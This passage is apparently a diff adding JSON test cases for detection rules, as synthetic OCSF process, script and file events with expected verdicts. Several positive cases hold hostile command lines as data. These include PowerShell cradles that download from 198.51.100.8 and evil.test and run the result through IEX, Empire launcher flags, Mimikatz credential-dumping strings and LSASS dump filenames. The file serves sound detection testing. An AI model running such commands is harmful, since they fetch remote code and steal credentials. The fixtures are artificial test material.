+            "uid": "proc-gt-09-tn-1"
+          },
+          "device": {
+            "type_id": 0,
+            "uid": "dev-gt-09-tn-1"
+          },
+          "actor": {
+            "app_name": "synthetic-actor"
+          }
+        },
+        "expected_match": false,
+        "expected_reason": "Legitimate unrenamed \\whoami.exe excluded by filter.",
+        "ocsf_version": "1.4.0"
+      },
+      {
+        "test_event_id": "gt-09-tn-2",
+        "ocsf_event_class": "Process Activity (1007)",
+        "category_uid": 1,
+        "class_uid": 1007,
+        "activity_id": 1,
+        "ocsf_fields": {
+          "process": {
+            "file": {
+              "path": "C:\\Windows\\System32\\ipconfig.exe",
+              "internal_name": "ipconfig.exe",
+              "type_id": 1,
+              "name": "ipconfig.exe"
+            },
+            "uid": "proc-gt-09-tn-2"
+          },
+          "device": {
+            "type_id": 0,
+            "uid": "dev-gt-09-tn-2"
+          },
+          "actor": {
+            "app_name": "synthetic-actor"
+          }
+        },
+        "expected_match": false,
+        "expected_reason": "Unrelated executable.",
+        "ocsf_version": "1.4.0"
+      }
+    ]
+  },
+  {
+    "index": 12,
+    "rule_id": "b730a276-6b63-41b8-bcf8-55930c8fc6ee",
+    "filename": "proc_creation_win_csc_susp_parent.yml",
+    "cases": [
+      {
+        "test_event_id": "gt-12-tp-1",
+        "ocsf_event_class": "Process Activity (1007)",
+        "category_uid": 1,
+        "class_uid": 1007,
+        "activity_id": 1,
+        "ocsf_fields": {
+          "process": {
+            "file": {
+              "path": "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe",
+              "type_id": 1,
+              "name": "csc.exe"
+            },
+            "parent_process": {
+              "file": {
+                "path": "C:\\Windows\\System32\\wscript.exe",
+                "type_id": 1,
+                "name": "wscript.exe"
+              },
+              "cmd_line": "wscript.exe C:\\Temp\\dropper.vbs",
+              "uid": "proc-gt-12-tp-1"
+            },
+            "uid": "proc-gt-12-tp-1"
+          },
+          "device": {
+            "type_id": 0,
+            "uid": "dev-gt-12-tp-1"
+          },
+          "actor": {
+            "app_name": "synthetic-actor"
+          }
+        },
+        "expected_match": true,
+        "expected_reason": "csc.exe spawned by wscript.exe (selection_parent_generic) outside Program Files.",
+        "ocsf_version": "1.4.0"
+      },
+      {
+        "test_event_id": "gt-12-tp-2",
+        "ocsf_event_class": "Process Activity (1007)",
+        "category_uid": 1,
+        "class_uid": 1007,
+        "activity_id": 1,
+        "ocsf_fields": {
+          "process": {
+            "file": {
+              "path": "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe",
+              "type_id": 1,
+              "name": "csc.exe"
+            },
+            "parent_process": {
+              "file": {
+                "path": "C:\\Users\\alice\\AppData\\Roaming\\agent.exe",
+                "type_id": 1,
+                "name": "agent.exe"
+              },
+              "cmd_line": "C:\\Users\\alice\\AppData\\Roaming\\agent.exe",
+              "uid": "proc-gt-12-tp-2"
+            },
+            "uid": "proc-gt-12-tp-2"
+          },
+          "device": {
+            "type_id": 0,
+            "uid": "dev-gt-12-tp-2"
+          },
+          "actor": {
+            "app_name": "synthetic-actor"
+          }
+        },
+        "expected_match": true,
+        "expected_reason": "csc.exe parent in \\AppData\\Roaming\\agent.exe matches regex selection_parent_susp_location.",
+        "ocsf_version": "1.4.0"
+      },
+      {
+        "test_event_id": "gt-12-tn-1",
+        "ocsf_event_class": "Process Activity (1007)",
+        "category_uid": 1,
+        "class_uid": 1007,
+        "activity_id": 1,
+        "ocsf_fields": {
+          "process": {
+            "file": {
+              "path": "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe",
+              "type_id": 1,
+              "name": "csc.exe"
+            },
+            "parent_process": {
+              "file": {
+                "path": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
+                "type_id": 1,
+                "name": "WINWORD.EXE"
+              },
+              "cmd_line": "WINWORD.EXE",
+              "uid": "proc-gt-12-tn-1"
+            },
+            "uid": "proc-gt-12-tn-1"
+          },
+          "device": {
+            "type_id": 0,
+            "uid": "dev-gt-12-tn-1"
+          },
+          "actor": {
+            "app_name": "synthetic-actor"
+          }
+        },
+        "expected_match": false,
+        "expected_reason": "Filtered by filter_main_programfiles (ParentImage starts with C:\\Program Files\\).",
+        "ocsf_version": "1.4.0"
+      },
+      {
+        "test_event_id": "gt-12-tn-2",
+        "ocsf_event_class": "Process Activity (1007)",
+        "category_uid": 1,
+        "class_uid": 1007,
+        "activity_id": 1,
+        "ocsf_fields": {
+          "process": {
+            "file": {
+              "path": "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe",
+              "type_id": 1,
+              "name": "csc.exe"
+            },
+            "parent_process": {
+              "file": {
+                "path": "C:\\Windows\\System32\\inetsrv\\w3wp.exe",
+                "type_id": 1,
+                "name": "w3wp.exe"
+              },
+              "cmd_line": "w3wp.exe -ap DefaultAppPool",
+              "uid": "proc-gt-12-tn-2"
+            },
+            "uid": "proc-gt-12-tn-2"
+          },
+          "device": {
+            "type_id": 0,
+            "uid": "dev-gt-12-tn-2"
+          },
+          "actor": {
+            "app_name": "synthetic-actor"
+          }
+        },
+        "expected_match": false,
+        "expected_reason": "Filtered by filter_main_w3p.",
+        "ocsf_version": "1.4.0"
+      }
+    ]
+  },
+  {
+    "index": 13,
+    "rule_id": "79f4ede3-402e-41c8-bc3e-ebbf5f162581",
+    "filename": "proc_creation_win_hktl_empire_powershell_launch.yml",
+    "cases": [
+      {
+        "test_event_id": "gt-13-tp-1",
+        "ocsf_event_class": "Process Activity (1007)",
+        "category_uid": 1,
+        "class_uid": 1007,
+        "activity_id": 1,
+        "ocsf_fields": {
+          "process": {
+            "file": {
+              "path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+              "type_id": 1,
+              "name": "powershell.exe"
+            },
+            "cmd_line": "powershell.exe -NoP -sta -NonI -W Hidden -Enc SQBFAFgA",
+            "uid": "proc-gt-13-tp-1"
+          },
+          "device": {
+            "type_id": 0,
+            "uid": "dev-gt-13-tp-1"
+          },
+          "actor": {
+            "app_name": "synthetic-actor"
+          }
+        },
+        "expected_match": true,
+        "expected_reason": "Matches canonical Empire launcher flags.",
+        "ocsf_version": "1.4.0"
+      },
+      {
+        "test_event_id": "gt-13-tp-2",
+        "ocsf_event_class": "Process Activity (1007)",
+        "category_uid": 1,
+        "class_uid": 1007,
+        "activity_id": 1,
+        "ocsf_fields": {
+          "process": {
+            "file": {
+              "path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+              "type_id": 1,
+              "name": "powershell.exe"
+            },
+            "cmd_line": "powershell -nop -exec bypass -EncodedCommand ZQBjAGgAbwA=",
+            "uid": "proc-gt-13-tp-2"
+          },
+          "device": {
+            "type_id": 0,
+            "uid": "dev-gt-13-tp-2"
+          },
+          "actor": {
+            "app_name": "synthetic-actor"
+          }
+        },
+        "expected_match": true,
+        "expected_reason": "Matches '-nop -exec bypass -EncodedCommand ' variant.",
+        "ocsf_version": "1.4.0"
+      },
+      {
+        "test_event_id": "gt-13-tn-1",
+        "ocsf_event_class": "Process Activity (1007)",
+        "category_uid": 1,
+        "class_uid": 1007,
+        "activity_id": 1,
+        "ocsf_fields": {
+          "process": {
+            "file": {
+              "path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+              "type_id": 1,
+              "name": "powershell.exe"
+            },
+            "cmd_line": "powershell.exe -ExecutionPolicy RemoteSigned -File C:\\Scripts\\backup.ps1",
+            "uid": "proc-gt-13-tn-1"
+          },
+          "device": {
+            "type_id": 0,
+            "uid": "dev-gt-13-tn-1"
+          },
+          "actor": {
+            "app_name": "synthetic-actor"
+          }
+        },
+        "expected_match": false,
+        "expected_reason": "Benign admin script execution.",
+        "ocsf_version": "1.4.0"
+      },
+      {
+        "test_event_id": "gt-13-tn-2",
+        "ocsf_event_class": "Process Activity (1007)",
+        "category_uid": 1,
+        "class_uid": 1007,
+        "activity_id": 1,
+        "ocsf_fields": {
+          "process": {
+            "file": {
+              "path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+              "type_id": 1,
+              "name": "powershell.exe"
+            },
+            "uid": "proc-gt-13-tn-2"
+          },
+          "device": {
+            "type_id": 0,
+            "uid": "dev-gt-13-tn-2"
+          },
+          "actor": {
+            "app_name": "synthetic-actor"
+          }
+        },
+        "expected_match": false,
+        "expected_reason": "Missing CommandLine must not match.",
+        "ocsf_version": "1.4.0"
+      }
+    ]
+  },
+  {
+    "index": 14,
+    "rule_id": "85b0b087-eddf-4a2b-b033-d771fa2b9775",
+    "filename": "proc_creation_win_powershell_download_iex.yml",
+    "cases": [
+      {
+        "test_event_id": "gt-14-tp-1",
+        "ocsf_event_class": "Process Activity (1007)",
+        "category_uid": 1,
+        "class_uid": 1007,
+        "activity_id": 1,
+        "ocsf_fields": {
+          "process": {
+            "cmd_line": "powershell.exe -c \"IEX(New-Object Net.WebClient).DownloadString('http://198.51.100.8/a.ps1')\"",
+            "uid": "proc-gt-14-tp-1"
+          },
+          "device": {
+            "type_id": 0,
+            "uid": "dev-gt-14-tp-1"
+          },
+          "actor": {
+            "app_name": "synthetic-actor"
+          }
+        },
+        "expected_match": true,
+        "expected_reason": "Contains both '.DownloadString(' and 'IEX('.",
+        "ocsf_version": "1.4.0"
+      },
+      {
+        "test_event_id": "gt-14-tp-2",
+        "ocsf_event_class": "Process Activity (1007)",
+        "category_uid": 1,
+        "class_uid": 1007,
+        "activity_id": 1,
+        "ocsf_fields": {
+          "process": {
+            "cmd_line": "pwsh -c \"iwr https://evil.test/s.ps1 -UseBasicParsing | IEX\"",
+            "uid": "proc-gt-14-tp-2"
+          },
+          "device": {
+            "type_id": 0,
+            "uid": "dev-gt-14-tp-2"
+          },
+          "actor": {
+            "app_name": "synthetic-actor"
+          }
+        },
+        "expected_match": true,
+        "expected_reason": "Contains 'iwr ' and '| IEX'.",
+        "ocsf_version": "1.4.0"
+      },
+      {
+        "test_event_id": "gt-14-tn-1",
+        "ocsf_event_class": "Process Activity (1007)",
+        "category_uid": 1,
+        "class_uid": 1007,
+        "activity_id": 1,
+        "ocsf_fields": {
+          "process": {
+            "cmd_line": "powershell.exe -c \"Invoke-WebRequest https://aka.ms/install.msi -OutFile install.msi\"",
+            "uid": "proc-gt-14-tn-1"
+          },
+          "device": {
+            "type_id": 0,
+            "uid": "dev-gt-14-tn-1"
+          },
+          "actor": {
+            "app_name": "synthetic-actor"
+          }
+        },
+        "expected_match": false,
+        "expected_reason": "Download without IEX execution.",
+        "ocsf_version": "1.4.0"
+      },
+      {
+        "test_event_id": "gt-14-tn-2",
+        "ocsf_event_class": "Process Activity (1007)",
+        "category_uid": 1,
+        "class_uid": 1007,
+        "activity_id": 1,
+        "ocsf_fields": {
+          "process": {
+            "cmd_line": "powershell.exe -c \"Invoke-Expression 'Get-Date'\"",
+            "uid": "proc-gt-14-tn-2"
+          },
+          "device": {
+            "type_id": 0,
+            "uid": "dev-gt-14-tn-2"
+          },
+          "actor": {
+            "app_name": "synthetic-actor"
+          }
+        },
+        "expected_match": false,
+        "expected_reason": "IEX without download cradle.",
+        "ocsf_version": "1.4.0"
+      }
+    ]
+  },
+  {
+    "index": 15,
+    "rule_id": "deb9b646-a508-44ee-b7c9-d8965921c6b6",
+    "filename": "proc_creation_win_powershell_token_obfuscation.yml",
+    "cases": [
+      {
+        "test_event_id": "gt-15-tp-1",
+        "ocsf_event_class": "Process Activity (1007)",
+        "category_uid": 1,
+        "class_uid": 1007,
+        "activity_id": 1,
+        "ocsf_fields": {
+          "process": {
+            "cmd_line": "powershell.exe -c \"In`vo`ke-Expression calc\"",
+            "uid": "proc-gt-15-tp-1"
+          },
+          "device": {
+            "type_id": 0,
+            "uid": "dev-gt-15-tp-1"
+          },
+          "actor": {
+            "app_name": "synthetic-actor"
+          }
+        },
+        "expected_match": true,
+        "expected_reason": "Backtick-obfuscated token matches \\w+`(?:\\w+|-|.)`[\\w+|\\s].",
+        "ocsf_version": "1.4.0"
+      },
+      {
+        "test_event_id": "gt-15-tp-2",
+        "ocsf_event_class": "Process Activity (1007)",
+        "category_uid": 1,
+        "class_uid": 1007,
+        "activity_id": 1,
+        "ocsf_fields": {
+          "process": {
+            "cmd_line": "powershell.exe -c \"${`e`n`v:PATH}\"",
+            "uid": "proc-gt-15-tp-2"
+          },
+          "device": {
+            "type_id": 0,
+            "uid": "dev-gt-15-tp-2"
+          },
+          "actor": {
+            "app_name": "synthetic-actor"
+          }
+        },
+        "expected_match": true,
+        "expected_reason": "Matches obfuscated ${`e`n`v:PATH} regex without matching literal ${env:path} filter.",
+        "ocsf_version": "1.4.0"
+      },
+      {
+        "test_event_id": "gt-15-tn-1",
+        "ocsf_event_class": "Process Activity (1007)",
+        "category_uid": 1,
+        "class_uid": 1007,
+        "activity_id": 1,
+        "ocsf_fields": {
+          "process": {
+            "cmd_line": "powershell.exe -c \"Write-Host ${env:path}\"",
+            "uid": "proc-gt-15-tn-1"
+          },
+          "device": {
+            "type_id": 0,
+            "uid": "dev-gt-15-tn-1"
+          },
+          "actor": {
+            "app_name": "synthetic-actor"
+          }
+        },
+        "expected_match": false,
+        "expected_reason": "Unobfuscated ${env:path} excluded by filter_main_envpath.",
+        "ocsf_version": "1.4.0"
+      },
+      {
+        "test_event_id": "gt-15-tn-2",
+        "ocsf_event_class": "Process Activity (1007)",
+        "category_uid": 1,
+        "class_uid": 1007,
+        "activity_id": 1,
+        "ocsf_fields": {
+          "process": {
+            "cmd_line": "powershell.exe -Command Get-Service",
+            "uid": "proc-gt-15-tn-2"
+          },
+          "device": {
+            "type_id": 0,
+            "uid": "dev-gt-15-tn-2"
+          },
+          "actor": {
+            "app_name": "synthetic-actor"
+          }
+        },
+        "expected_match": false,
+        "expected_reason": "Clean PowerShell command without obfuscation.",
+        "ocsf_version": "1.4.0"
+      }
+    ]
+  },
+  {
+    "index": 17,
+    "rule_id": "189e3b02-82b2-4b90-9662-411eb64486d4",
+    "filename": "posh_ps_potential_invoke_mimikatz.yml",
+    "cases": [
+      {
+        "test_event_id": "gt-17-tp-1",
+        "ocsf_event_class": "Script Activity (1009)",
+        "category_uid": 1,
+        "class_uid": 1009,
+        "activity_id": 1,
+        "ocsf_fields": {
+          "script": {
+            "type_id": 2,
+            "type": "PowerShell",
+            "script_content": {
+              "value": "function Invoke-Mimikatz { param([switch]$DumpCreds, [switch]$DumpCerts) }",
+              "is_truncated": false
+            }
+          },
+          "device": {
+            "type_id": 0,
+            "uid": "dev-gt-17-tp-1"
+          },
+          "actor": {
+            "app_name": "synthetic-actor"
+          }
+        },
+        "expected_match": true,
+        "expected_reason": "ScriptBlockText contains both 'DumpCreds' and 'DumpCerts' (selection_1).",
+        "ocsf_version": "1.4.0"
+      },
+      {
+        "test_event_id": "gt-17-tp-2",
+        "ocsf_event_class": "Script Activity (1009)",
+        "category_uid": 1,
+        "class_uid": 1009,
+        "activity_id": 1,
+        "ocsf_fields": {
+          "script": {
+            "type_id": 2,
+            "type": "PowerShell",
+            "script_content": {
+              "value": "$cmd = 'privilege::debug sekurlsa::logonpasswords exit'",
+              "is_truncated": false
+            }
+          },
+          "device": {
+            "type_id": 0,
+            "uid": "dev-gt-17-tp-2"
+          },
+          "actor": {
+            "app_name": "synthetic-actor"
+          }
+        },
+        "expected_match": true,
+        "expected_reason": "ScriptBlockText contains 'sekurlsa::logonpasswords' (selection_2).",
+        "ocsf_version": "1.4.0"
+      },
+      {
+        "test_event_id": "gt-17-tn-1",
+        "ocsf_event_class": "Script Activity (1009)",
+        "category_uid": 1,
+        "class_uid": 1009,
+        "activity_id": 1,
+        "ocsf_fields": {
+          "script": {
+            "type_id": 2,
+            "type": "PowerShell",
+            "script_content": {
+              "value": "param([switch]$DumpCreds) # certificate switch omitted",
+              "is_truncated": false
+            }
+          },
+          "device": {
+            "type_id": 0,
+            "uid": "dev-gt-17-tn-1"
+          },
+          "actor": {
+            "app_name": "synthetic-actor"
+          }
+        },
+        "expected_match": false,
+        "expected_reason": "Only one of the two required tokens in selection_1 (DumpCerts absent).",
+        "ocsf_version": "1.4.0"
+      },
+      {
+        "test_event_id": "gt-17-tn-2",
+        "ocsf_event_class": "Script Activity (1009)",
+        "category_uid": 1,
+        "class_uid": 1009,
+        "activity_id": 1,
+        "ocsf_fields": {
+          "script": {
+            "type_id": 2,
+            "type": "PowerShell",
+            "script_content": {
+              "value": "Get-ChildItem Cert:\\LocalMachine\\My",
+              "is_truncated": false
+            }
+          },
+          "device": {
+            "type_id": 0,
+            "uid": "dev-gt-17-tn-2"
+          },
+          "actor": {
+            "app_name": "synthetic-actor"
+          }
+        },
+        "expected_match": false,
+        "expected_reason": "Benign certificate inspection script.",
+        "ocsf_version": "1.4.0"
+      },
+      {
+        "test_event_id": "gt-17-tn-3-sibling-only",
+        "ocsf_event_class": "Script Activity (1009)",
+        "category_uid": 1,
+        "class_uid": 1009,
+        "activity_id": 1,
+        "ocsf_fields": {
+          "script": {
+            "type_id": 2,
+            "type": "PowerShell",
+            "script_content": {
+              "value": "Get-Date",
+              "is_truncated": false
+            }
+          },
+          "device": {
+            "type_id": 0,
+            "uid": "dev-gt-17-tn-3-sibling-only"
+          },
+          "actor": {
+            "app_name": "synthetic-actor"
+          }
+        },
+        "expected_match": false,
+        "expected_reason": "OCSF v1.4.0 long_string isolation: suspicious text appears only in script.name/uid, while script.script_content.value is benign.",
+        "ocsf_version": "1.4.0"
+      }
+    ]
+  },
+  {
+    "index": 18,
+    "rule_id": "a136cde0-61ad-4a61-9b82-8dc490e60dd2",
+    "filename": "posh_pm_invoke_obfuscation_clip.yml",
+    "cases": [
+      {
+        "test_event_id": "gt-18-tp-1",
+        "ocsf_event_class": "Script Activity (1009)",
+        "category_uid": 1,
+        "class_uid": 1009,
+        "activity_id": 1,
+        "ocsf_fields": {
+          "script": {
+            "type_id": 2,
+            "type": "PowerShell",
+            "script_content": {
+              "value": "cmd /c echo payload|clip.exe && [void][windows.forms.clipboard]::( \\\"{0}{1}\\\"-f\"Get\",\"Text\" )",
+              "is_truncated": false
+            }
+          },
+          "device": {
+            "type_id": 0,
+            "uid": "dev-gt-18-tp-1"
+          },
+          "actor": {
+            "app_name": "synthetic-actor"
+          }
+        },
+        "expected_match": true,
+        "expected_reason": "Matches Invoke-Obfuscation CLIP case-sensitive regex in Payload.",
+        "ocsf_version": "1.4.0"
+      },
+      {
+        "test_event_id": "gt-18-tp-2",
+        "ocsf_event_class": "Script Activity (1009)",
+        "category_uid": 1,
+        "class_uid": 1009,
+        "activity_id": 1,
+        "ocsf_fields": {
+          "script": {
+            "type_id": 2,
+            "type": "PowerShell",
+            "script_content": {
+              "value": "cmd.exe /r set a=1|clip && [system.windows.clipboard]::( \\\"{1}{0}\\\" -f \"xt\",\"GetTe\")",
+              "is_truncated": false
+            }
+          },
+          "device": {
+            "type_id": 0,
+            "uid": "dev-gt-18-tp-2"
+          },
+          "actor": {
+            "app_name": "synthetic-actor"
+          }
+        },
+        "expected_match": true,
+        "expected_reason": "Matches cmd.exe /r ... clip && ... clipboard]::( \\\"{d}...-f...\" variant.",
+        "ocsf_version": "1.4.0"
+      },
+      {
+        "test_event_id": "gt-18-tn-1",
+        "ocsf_event_class": "Script Activity (1009)",
+        "category_uid": 1,
+        "class_uid": 1009,
+        "activity_id": 1,
+        "ocsf_fields": {
+          "script": {
+            "type_id": 2,
+            "type": "PowerShell",
+            "script_content": {
+              "value": "Get-Clipboard -Format Text",
+              "is_truncated": false
+            }
+          },
+          "device": {
+            "type_id": 0,
+            "uid": "dev-gt-18-tn-1"
+          },
+          "actor": {
+            "app_name": "synthetic-actor"
+          }
+        },
+        "expected_match": false,
+        "expected_reason": "Standard Get-Clipboard cmdlet.",
+        "ocsf_version": "1.4.0"
+      },
+      {
+        "test_event_id": "gt-18-tn-2",
+        "ocsf_event_class": "Script Activity (1009)",
+        "category_uid": 1,
+        "class_uid": 1009,
+        "activity_id": 1,
+        "ocsf_fields": {
+          "script": {
+            "type_id": 2,
+            "type": "PowerShell",
+            "script_content": {
+              "value": "cmd /c dir | clip.exe",
+              "is_truncated": false
+            }
+          },
+          "device": {
+            "type_id": 0,
+            "uid": "dev-gt-18-tn-2"
+          },
+          "actor": {
+            "app_name": "synthetic-actor"
+          }
+        },
+        "expected_match": false,
+        "expected_reason": "Simple cmd pipe to clip.exe without clipboard reflection obfuscation.",
+        "ocsf_version": "1.4.0"
+      },
+      {
+        "test_event_id": "gt-18-tn-3-sibling-only",
+        "ocsf_event_class": "Script Activity (1009)",
+        "category_uid": 1,
+        "class_uid": 1009,
+        "activity_id": 1,
+        "ocsf_fields": {
+          "script": {
+            "type_id": 2,
+            "type": "PowerShell",
+            "script_content": {
+              "value": "Get-Date",
+              "is_truncated": false
+            }
+          },
+          "device": {
+            "type_id": 0,
+            "uid": "dev-gt-18-tn-3-sibling-only"
+          },
+          "actor": {
+            "app_name": "synthetic-actor"
+          }
+        },
+        "expected_match": false,
+        "expected_reason": "OCSF v1.4.0 long_string isolation: suspicious text appears only in script.name/uid, while script.script_content.value is benign.",
+        "ocsf_version": "1.4.0"
+      }
+    ]
+  },
+  {
+    "index": 20,
+    "rule_id": "a5a2d357-1ab8-4675-a967-ef9990a59391",
+    "filename": "file_event_win_lsass_default_dump_file_names.yml",
+    "cases": [
+      {
+        "test_event_id": "gt-20-tp-1",
+        "ocsf_event_class": "File System Activity (1001)",
+        "category_uid": 1,
+        "class_uid": 1001,
+        "activity_id": 1,
+        "ocsf_fields": {
+          "file": {
+            "path": "C:\\Users\\wardog\\AppData\\Local\\Temp\\lsass-comsvcs.dmp",
+            "type_id": 1,
+            "name": "lsass-comsvcs.dmp"
+          },
+          "device": {
+            "type_id": 0,
+            "uid": "dev-gt-20-tp-1"
+          },
+          "actor": {
+            "app_name": "synthetic-actor"
+          }
+        },
+        "expected_match": true,
+        "expected_reason": "TargetFilename contains '\\lsass' and '.dmp' (selection_3).",
+        "ocsf_version": "1.4.0"
+      },
+      {
+        "test_event_id": "gt-20-tp-2",
+        "ocsf_event_class": "File System Activity (1001)",
+        "category_uid": 1,
+        "class_uid": 1001,
+        "activity_id": 1,
+        "ocsf_fields": {
+          "file": {
+            "path": "C:\\Temp\\nanodump_991.dmp",
+            "type_id": 1,
+            "name": "nanodump_991.dmp"
+          },
+          "device": {
+            "type_id": 0,
+            "uid": "dev-gt-20-tp-2"
+          },
+          "actor": {
+            "app_name": "synthetic-actor"
+          }
+        },
+        "expected_match": true,
+        "expected_reason": "TargetFilename contains '\\nanodump' and ends with '.dmp' (selection_5).",
+        "ocsf_version": "1.4.0"
+      },
+      {
+        "test_event_id": "gt-20-tn-1",
+        "ocsf_event_class": "File System Activity (1001)",
+        "category_uid": 1,
+        "class_uid": 1001,
+        "activity_id": 1,
+        "ocsf_fields": {
+          "file": {
+            "path": "C:\\Windows\\Temp\\app_crash.dmp",
+            "type_id": 1,
+            "name": "app_crash.dmp"
+          },
+          "device": {
+            "type_id": 0,
+            "uid": "dev-gt-20-tn-1"
+          },
+          "actor": {
+            "app_name": "synthetic-actor"
+          }
+        },
+        "expected_match": false,
+        "expected_reason": "Crash dump unrelated to lsass/nanodump/SQLDmpr.",
+        "ocsf_version": "1.4.0"
+      },
+      {
+        "test_event_id": "gt-20-tn-2",
+        "ocsf_event_class": "File System Activity (1001)",
+        "category_uid": 1,
+        "class_uid": 1001,
+        "activity_id": 1,
+        "ocsf_fields": {
+          "file": {
+            "path": "C:\\Windows\\System32\\lsass.exe",
+            "type_id": 1,
+            "name": "lsass.exe"
+          },
+          "device": {
+            "type_id": 0,
+            "uid": "dev-gt-20-tn-2"
+          },
+          "actor": {
+            "app_name": "synthetic-actor"
+          }
+        },
+        "expected_match": false,
+        "expected_reason": "lsass.exe binary path is not a dump archive/file.",
+        "ocsf_version": "1.4.0"
+      }
+    ]
+  },
+  {
+    "index": 21,
+    "rule_id": "69ca12af-119d-44ed-b50f-a47af0ebc364",
+    "filename": "file_event_win_taskmgr_lsass_dump.yml",
+    "cases": [
+      {
+        "test_event_id": "gt-21-tp-1",
+        "ocsf_event_class": "File System Activity (1001)",
+        "category_uid": 1,
+        "class_uid": 1001,
+        "activity_id": 1,
+        "ocsf_fields": {
+          "actor": {
+            "process": {
+              "file": {
+                "path": "C:\\Windows\\System32\\taskmgr.exe",
+                "type_id": 1,
+                "name": "taskmgr.exe"
+              },
+              "uid": "proc-gt-21-tp-1"
+            }
+          },
+          "file": {
+            "path": "C:\\Users\\admin\\AppData\\Local\\Temp\\lsass (2).DMP",
+            "type_id": 1,
+            "name": "lsass (2).DMP"
+          },
+          "device": {
+            "type_id": 0,
+            "uid": "dev-gt-21-tp-1"
+          }
+        },
+        "expected_match": true,
+        "expected_reason": "taskmgr.exe writing lsass .DMP into AppData\\Local\\Temp\\.",
+        "ocsf_version": "1.4.0"
+      },
+      {
+        "test_event_id": "gt-21-tp-2",
+        "ocsf_event_class": "File System Activity (1001)",
+        "category_uid": 1,
+        "class_uid": 1001,
+        "activity_id": 1,
+        "ocsf_fields": {
+          "actor": {
+            "process": {
+              "file": {
+                "path": "D:\\Windows\\SysWOW64\\Taskmgr.exe",
+                "type_id": 1,
+                "name": "Taskmgr.exe"
+              },
+              "uid": "proc-gt-21-tp-2"
+            }
+          },
+          "file": {
+            "path": "D:\\Users\\bob\\AppData\\Local\\Temp\\lsass.dmp",
+            "type_id": 1,
+            "name": "lsass.dmp"
+          },
+          "device": {
+            "type_id": 0,
+            "uid": "dev-gt-21-tp-2"
+          }
+        },
+        "expected_match": true,
+        "expected_reason": "SysWOW64 Taskmgr.exe case-insensitive match.",
+        "ocsf_version": "1.4.0"
+      },
+      {
+        "test_event_id": "gt-21-tn-1",
+        "ocsf_event_class": "File System Activity (1001)",
+        "category_uid": 1,
+        "class_uid": 1001,
+        "activity_id": 1,
+        "ocsf_fields": {
+          "actor": {
+            "process": {
+              "file": {
+                "path": "C:\\Windows\\System32\\taskmgr.exe",
+                "type_id": 1,
+                "name": "taskmgr.exe"
+              },
+              "uid": "proc-gt-21-tn-1"
+            }
+          },
+          "file": {
+            "path": "C:\\Users\\admin\\AppData\\Local\\Temp\\notepad.DMP",
+            "type_id": 1,
+            "name": "notepad.DMP"
+          },
+          "device": {
+            "type_id": 0,
+            "uid": "dev-gt-21-tn-1"
+          }
+        },
+        "expected_match": false,
+        "expected_reason": "taskmgr.exe dumping notepad rather than lsass.",
+        "ocsf_version": "1.4.0"
+      },
+      {
+        "test_event_id": "gt-21-tn-2",
+        "ocsf_event_class": "File System Activity (1001)",
+        "category_uid": 1,
+        "class_uid": 1001,
+        "activity_id": 1,
+        "ocsf_fields": {
+          "actor": {
+            "process": {
+              "file": {
+                "path": "C:\\Tools\\procdump.exe",
+                "type_id": 1,
+                "name": "procdump.exe"
+              },
+              "uid": "proc-gt-21-tn-2"
+            }
+          },
+          "file": {
+            "path": "C:\\Users\\admin\\AppData\\Local\\Temp\\lsass.DMP",
+            "type_id": 1,
+            "name": "lsass.DMP"
+          },
+          "device": {
+            "type_id": 0,
+            "uid": "dev-gt-21-tn-2"
+          }
+        },
+        "expected_match": false,
+        "expected_reason": "Created by procdump.exe rather than taskmgr.exe.",
+        "ocsf_version": "1.4.0"
+      }
+    ]
+  },
+  {
+    "index": 22,
+    "rule_id": "7047d730-036f-4f40-b9d8-1c63e36d5e62",
+    "filename": "file_event_win_powershell_drop_binary_or_script.yml",
+    "cases": [
+      {
+        "test_event_id": "gt-22-tp-1",
+        "ocsf_event_class": "File System Activity (1001)",
+        "category_uid": 1,
+        "class_uid": 1001,
+        "activity_id": 1,
+        "ocsf_fields": {
+          "actor": {
+            "process": {
+              "file": {
+                "path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+                "type_id": 1,
+                "name": "powershell.exe"
+              },
+              "uid": "proc-gt-22-tp-1"
+            }
+          },
+          "file": {
+            "path": "C:\\Users\\Public\\sandcat.exe",
+            "type_id": 1,
+            "name": "sandcat.exe"
+          },
+          "device": {
+            "type_id": 0,
+            "uid": "dev-gt-22-tp-1"
+          }
+        },
+        "expected_match": true,
+        "expected_reason": "powershell.exe dropping .exe in C:\\Users\\Public\\ (not in Temp filter).",
+        "ocsf_version": "1.4.0"
+      },
+      {
+        "test_event_id": "gt-22-tp-2",
+        "ocsf_event_class": "File System Activity (1001)",
+        "category_uid": 1,
+        "class_uid": 1001,
+        "activity_id": 1,
+        "ocsf_fields": {
+          "actor": {
+            "process": {
+              "file": {
+                "path": "C:\\Program Files\\PowerShell\\7\\pwsh.exe",
+                "type_id": 1,
+                "name": "pwsh.exe"
+              },
+              "uid": "proc-gt-22-tp-2"
+            }
+          },
+          "file": {
+            "path": "C:\\Users\\alice\\AppData\\Local\\Temp\\stager.vbs",
+            "type_id": 1,
+            "name": "stager.vbs"
+          },
+          "device": {
+            "type_id": 0,
+            "uid": "dev-gt-22-tp-2"
+          }
+        },
+        "expected_match": true,
+        "expected_reason": "pwsh.exe dropping .vbs in Temp (filter_main_user_temp only excludes .dll and .exe, NOT .vbs!).",
+        "ocsf_version": "1.4.0"
+      },
+      {
+        "test_event_id": "gt-22-tn-1",
+        "ocsf_event_class": "File System Activity (1001)",
+        "category_uid": 1,
+        "class_uid": 1001,
+        "activity_id": 1,
+        "ocsf_fields": {
+          "actor": {
+            "process": {
+              "file": {
+                "path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+                "type_id": 1,
+                "name": "powershell.exe"
+              },
+              "uid": "proc-gt-22-tn-1"
+            }
+          },
+          "file": {
+            "path": "C:\\Users\\alice\\AppData\\Local\\Temp\\__PSScriptPolicy.dll",
+            "type_id": 1,
+            "name": "__PSScriptPolicy.dll"
